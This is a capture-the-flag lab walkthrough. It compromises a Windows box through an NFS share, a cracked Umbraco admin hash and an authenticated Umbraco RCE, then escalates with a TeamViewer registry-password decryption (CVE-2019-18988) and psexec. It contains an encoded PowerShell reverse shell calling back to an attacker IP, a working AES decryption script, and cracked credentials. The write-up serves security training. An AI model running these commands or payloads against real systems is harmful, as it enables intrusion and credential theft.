# Initial Recon
## Port Scanning
### All Port Nmap Scanning

```
sudo nmap -p- -T4 --min-rate 10000 -vv -oA nmap/all 10.129.222.156
```

```shell
sudo nmap -p- -T4 --min-rate 10000 -vv -Pn -oA nmap/pingless 10.129.222.156
```

![[Pasted image 20240522103358.png]]

### Versions Nmap Scanning

Extract the ports from our nmap scans:

```shell
cat pingless.nmap | grep tcp | grep -v closed | grep -iv timeout | grep -iv filter | cut -d '/' -f 1 | tr \\n ','

21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680,
```

Use the ports list for the following nmap scan command:

```shell
sudo nmap -p21,80,111,135,139,445,2049,5985,47001,49664,49665,49666,49667,49678,49679,49680 -T4 --min-rate 10000 -sCV -O -oA nmap/versions -vv 10.129.222.156
```

![[Pasted image 20240522103459.png]]

## Website Enumeration - Port 80

![[Pasted image 20240521202313.png]]

http://10.129.222.156/products/

![[Pasted image 20240521202406.png]]

http://10.129.222.156/1111

Products by ID

![[Pasted image 20240521202541.png]]

On the `people` page, we find possible employees that we can spray passwords for.

![[Pasted image 20240521202617.png]]

http://10.129.222.156/about-us/todo-list-for-the-starter-kit/

Possible vhosts for `v1` and `vNext`. Some insight to domain specific details of their company and website.

![[Pasted image 20240521202853.png]]

http://10.129.222.156/contact/

Umbraco Forms presumably from the Umbarco CMS.

![[Pasted image 20240521203044.png]]

## NFS Enumeration - TCP 2049

### NFS Specific Nmap Scan

```shell
sudo nmap -p2049 --script nfs* -T4 --min-rate 10000 -sCV -oA nmap/nfs -vv 10.129.222.156
```

![[Pasted image 20240522104037.png]]

### NFS Local Mount

Our Nmap scan reveals that there is an open NFS directory `site_backups` we can mount on port 2049.

We then create and mount the `site_backups` directory onto our attack machine:

```shell
sudo mkdir /mnt/site_backups
sudo mount -t nfs 10.129.222.156:/site_backups /mnt/site_backups -o nolock
cd /mnt/site_backups
```

![[Pasted image 20240522091710.png]]

Searching through the mount we find a potentially useful database file `Umbraco.sdf`:

![[Pasted image 20240522092107.png]]

Unfortunately, tools that were originally used to open `.sdf` files, are deprecated. We can use the `strings` command to neatly `grep` through the byte data for useful terms. Searching by `hash` exposes hashes to the accounts `admin` and `smith`:

```shell
strings Umbraco.sdf | grep -i hash
```

![[Pasted image 20240521214909.png]]

We can copy and paste the admin hash into its own file for cracking:

```shell
echo 'b8be16afba8c314ad33d812f22a04991b90e2aaa' > umbraco.hashes
```

Using `john` with the `rockyou.txt` word list cracks the password `baconandcheese` for the user `admin` and email `admin@htb.local`:

```shell
john umbraco.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

![[Pasted image 20240521215015.png]]

# Initial Foothold

## Password Attack on Umbraco

I used the following credentials:

```
admin@htb.local
baconandcheese
```

![[Pasted image 20240521215610.png]]

Using the admin credential we found from the `Umbraco.sdf`, we're able to authenticate into the CMS.

![[Pasted image 20240521220022.png]]

Clicking the help icon on the lower left hand corner reveals that this environment is running `Umbraco version 7.12.4`.

![[Pasted image 20240521215922.png]]

## Remote Code Execution Exploitation

From this information, we can see if there are any vulnerabilities for `7.12.4`. Searching Exploit Database by the search term `Umbraco`, we can see that there is an authenticated remote code execution vulnerability we can try to exploit.

https://www.exploit-db.com/exploits/49488

![[Pasted image 20240522074624.png]]

We can copy and paste the code into a `pwn.py` file on our attack machine. And then we can test the proof of concept using a basic `whoami` command using the Umbraco credentials for `admin`.

```shell
python pwn.py -u admin@htb.local -p baconandcheese -i http://10.129.222.156 -c whoami
```

![[Pasted image 20240521221647.png]]

## Reverse Shell into the System

Now that we have confirmed that the target machine is vulnerable to remote code execution, we can now attempt to create a reverse shell. We can use the Reverse Shell Generator project to create a base 64 encoded `Powershell` reverse shell.

https://www.revshells.com/

![[Pasted image 20240521221940.png]]

Run a `nc` listener on the attack machine:

![[Pasted image 20240521222136.png]]

Run the exploit using `powershell.exe` as the command and the `-e` powershell flag reverse with the encoded shell as the argument (`-a`) for the exploit command:

```shell
python pwn.py -u admin@htb.local -p baconandcheese -i http://10.129.222.156 -c "powershell.exe" -a "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA1ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

![[Pasted image 20240521223041.png]]

Confirm compromise of the IIS user:

![[Pasted image 20240521223107.png]]

### Obtaining User Flag

![[Pasted image 20240521223339.png]]

# Privilege Escalation

## Enumeration

### Service Enumeration

Enumerating the running services on the target machine reveals that the non-standard service `TeamViewer7` is running on the machine.

![[Pasted image 20240522102214.png]]

### Service Information Gathering

Doing a Google search for `Teamviewer7 vulnerabilities site:github.com` reveals the following codebase https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat:

![[Pasted image 20240522102727.png]]

```
REM # CVE-2019-18988
REM # Teamviewer Local Privesc

REM https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264

reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v Version
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7

reg query HKLM\SOFTWARE\TeamViewer\Temp /v SecurityPasswordExported

reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
reg query HKLM\SOFTWARE\TeamViewer\Version7

reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v SecurityPasswordExported
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v ServerPasswordAES 
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v ProxyPasswordAES
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v LicenseKeyAES
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v OptionsPassword
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v PermanentPassword


REM CYBERCHEF RECIPE 
REM AES_Decrypt({'option':'Hex','string':'0602000000a400005253413100040000'},{'option':'Hex','string':'0100010067244F436E6762F25EA8D704'},'CBC','Hex','Raw',{'option':'Hex','string':''})Decode_text('UTF-16LE (1200)')

```

We can see that there are registry keys that hold valuable information for TeamViewer7. We can navigate to the registry keys for this software and see what information we can gather:

```powershell
cd HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7
Get-ItemProperty -path .
```

![[Pasted image 20240521232911.png]]

We can expand the `SecurityPasswordAES` property to get all the values for the encrypted TeamViewer password:

```powershell
(Get-ItemProperty -path .).SecurityPasswordAES
```

![[Pasted image 20240521233100.png]]

Save the  values to a file on the attack machine `tv.bytes` and then transform it to a comma delimited list:

```shell
vim tv.bytes

255
155
28
115
214
107
206
49
172
65
62
174
19
27
70
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91
```

Replace all new lines with a comma, we will use this output later in a few more steps:

```shell
cat tv.bytes | tr '\n' ','
```

From the codebase we can see that the passwords are encrypted using AES with the CBC cipher mode and has the following key and IV values:

![[Pasted image 20240522095611.png]]

To avoid the complication of having to install .NET and compile the code on our attack machine, we can create a simpler python script with all the values hard-coded and save it as `decode.py`. We can copy-paste the output from `cat tv.bytes | tr '\n' ','` now to assign our values to `ciperText`:

```python
#!/usr/bin/env python3

from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"

ciperText = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 
                    126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciperText).decode("utf-16").rstrip("\x00")

print(f"[+] Found password: {password}")
```

Running the python code reveals the password for TeamViewer:

```shell
python decode.py
!R3m0te!
```

## Exploitation

Using this new found password, use it in junction with `Psexec` to attempt to gain access to the `Administrator` account on the target machine:

```
impacket-psexec 'htb.local'/'Administrator':'!R3m0te!'@10.129.222.156
```

![[Pasted image 20240521233450.png]]

We are able to connect and find the root flag on the `Administrator` Desktop:

```
c673b5ef5892e554637d1985e4fff617
```
